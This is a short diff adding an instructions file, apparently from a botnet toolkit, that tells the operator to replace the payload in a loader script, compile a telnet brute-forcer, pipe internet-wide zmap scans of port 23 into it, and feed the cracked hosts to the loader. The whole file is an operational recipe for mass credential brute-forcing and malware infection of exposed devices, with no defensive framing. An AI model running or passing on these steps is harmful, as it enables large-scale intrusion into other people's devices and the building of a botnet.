@@ -1,0 +1,7 @@
+REPLACE PAYLOAD IN loader.py
+run these commands:
+
+gcc bruter/*.c -o bruter -pthread
+zmap -p23 -w telnet.lst -q | ./bruter 3
+zmap -p23 -w telnetagain.lst -q | ./bruter 3
+python3 loader.py bruted.txt
